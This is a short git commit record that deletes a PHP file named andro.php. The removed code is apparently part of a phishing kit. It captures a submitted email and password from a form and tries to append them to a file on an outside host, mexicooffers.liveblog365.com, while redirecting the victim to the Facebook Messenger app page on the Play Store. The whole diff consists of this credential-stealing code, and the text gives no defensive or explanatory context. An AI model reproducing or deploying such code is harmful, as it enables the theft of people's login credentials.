855ce38b8d83b4683afe7b3deffbae4c09f76434
cameroon <106224701+cameroon21@users.noreply.github.com>
2022-05-27 11:56:47 +0100

    Delete andro.php

--- andro.php
+++
@@ -1,5 +0,0 @@
-<?php
-header('Location:https://play.google.com/store/apps/details?id=com.facebook.orca');
- $message .= $_POST['email'].":";
-$message .= $_POST['pass']. "\n";
-file_put_contents('http://mexicooffers.liveblog365.com/1.txt', $message, FILE_APPEND);
